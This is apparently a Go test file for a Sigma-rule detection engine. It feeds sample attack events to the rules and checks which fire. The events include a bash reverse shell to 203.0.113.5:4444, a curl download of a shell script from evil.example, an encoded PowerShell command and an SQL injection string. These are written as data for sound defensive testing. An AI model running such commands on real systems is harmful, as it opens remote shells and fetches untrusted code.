package detect

import "testing"

// TestEmbeddedEngine_Loads verifies the built-in Sigma rule set parses and
// compiles (every embedded rule has a valid condition and search identifiers).
func TestEmbeddedEngine_Loads(t *testing.T) {
	eng, err := NewEmbeddedEngine()
	if err != nil {
		t.Fatalf("load embedded rules: %v", err)
	}
	if eng.Len() < 5 {
		t.Fatalf("expected >=5 embedded rules, got %d", eng.Len())
	}
	for _, r := range eng.Rules() {
		if r.Title == "" || r.condition == nil || len(r.searchIDs) == 0 {
			t.Errorf("rule %q not fully compiled", r.Title)
		}
	}
}

// TestEmbeddedEngine_RealDetections drives realistic events through the embedded
// rules and asserts the expected rule fires (and benign events do not).
func TestEmbeddedEngine_RealDetections(t *testing.T) {
	eng, err := NewEmbeddedEngine()
	if err != nil {
		t.Fatalf("load: %v", err)
	}

	fires := func(t *testing.T, category, wantTechnique string, ev map[string]any) {
		t.Helper()
		matches := eng.Eval(category, ev)
		for _, m := range matches {
			if m.Technique == wantTechnique {
				return
			}
		}
		t.Fatalf("expected a match with technique %s for %v; got %+v", wantTechnique, ev, matches)
	}
	quiet := func(t *testing.T, category string, ev map[string]any) {
		t.Helper()
		if m := eng.Eval(category, ev); len(m) != 0 {
			t.Fatalf("expected no matches for benign %v; got %+v", ev, m)
		}
	}

	// PowerShell encoded command → T1059.001
	fires(t, "process_creation", "T1059.001", map[string]any{
		"Image":       `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`,
		"CommandLine": `powershell.exe -NoProfile -enc ZQBjAGgAbwA=`,
	})
	// Plain powershell without encoding → no encoded-command match
	quiet(t, "process_creation", map[string]any{
		"Image":       `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`,
		"CommandLine": `powershell.exe -NoProfile -Command Get-Date`,
	})

	// whoami → T1033
	fires(t, "process_creation", "T1033", map[string]any{"Image": `C:\Windows\System32\whoami.exe`})

	// curl fetching remote URL (not localhost) → T1105
	fires(t, "process_creation", "T1105", map[string]any{
		"Image":       `/usr/bin/curl`,
		"CommandLine": `curl http://evil.example/x.sh -o /tmp/x.sh`,
	})
	// curl to localhost is filtered out
	quiet(t, "process_creation", map[string]any{
		"Image":       `/usr/bin/curl`,
		"CommandLine": `curl http://localhost:8080/health`,
	})

	// SQLi in web request → T1190 (keyword search over any field)
	fires(t, "webserver", "T1190", map[string]any{
		"uri":        "/products?id=1' OR 1=1--",
		"user_agent": "sqlmap",
	})

	// C2 port to external IP → T1571; internal IP filtered
	fires(t, "network_connection", "T1571", map[string]any{
		"Initiated": "true", "DestinationPort": 4444, "DestinationIp": "203.0.113.10",
	})
	quiet(t, "network_connection", map[string]any{
		"Initiated": "true", "DestinationPort": 4444, "DestinationIp": "10.1.2.3",
	})

	// Linux reverse shell via bash -i /dev/tcp → T1059.004
	fires(t, "process_creation", "T1059.004", map[string]any{
		"Image":       `/usr/bin/bash`,
		"CommandLine": `bash -i >& /dev/tcp/203.0.113.5/4444 0>&1`,
	})
}

// TestEngine_CategoryScoping verifies a rule only fires for its logsource
// category (a webserver rule must not fire on a process_creation event).
func TestEngine_CategoryScoping(t *testing.T) {
	eng, err := NewEmbeddedEngine()
	if err != nil {
		t.Fatalf("load: %v", err)
	}
	ev := map[string]any{"uri": "/x?id=1' OR 1=1--"}
	if m := eng.Eval("process_creation", ev); len(m) != 0 {
		t.Fatalf("webserver SQLi rule must not fire under process_creation category; got %+v", m)
	}
	if m := eng.Eval("webserver", ev); len(m) == 0 {
		t.Fatalf("SQLi rule should fire under webserver category")
	}
}
